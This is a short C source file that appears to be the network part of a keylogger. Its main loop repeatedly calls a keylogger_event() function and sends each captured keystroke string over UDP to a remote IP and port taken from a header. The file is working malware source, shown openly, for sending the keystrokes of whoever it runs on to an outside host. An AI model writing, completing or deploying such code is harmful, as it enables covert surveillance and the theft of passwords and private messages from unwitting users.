#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#include "network.h"

int init_connection()
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (sock == INVALID_SOCKET)
    {
        perror("socket()");
        exit(errno);
    }
    printf("socket creates successfully\n");
    return sock;
}

void send_message(int sock, struct sockaddr_in serv, char *buffer)
{
    socklen_t server_struct_length = sizeof(serv);
    if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&serv, server_struct_length) < 0)
    {
        perror("sendto()");
        exit(errno);
    }
}

void app()
{
    int sock = init_connection();
    struct sockaddr_in serv;
    char client_message[BUF_SIZE];

    memset(client_message, '\0', sizeof(client_message));

    serv.sin_family = AF_INET;
    serv.sin_port = htons(PORT);
    serv.sin_addr.s_addr = inet_addr(IP);

    while (1)
    {
        char *key = keylogger_event();
        send_message(sock, serv, key);
    }
}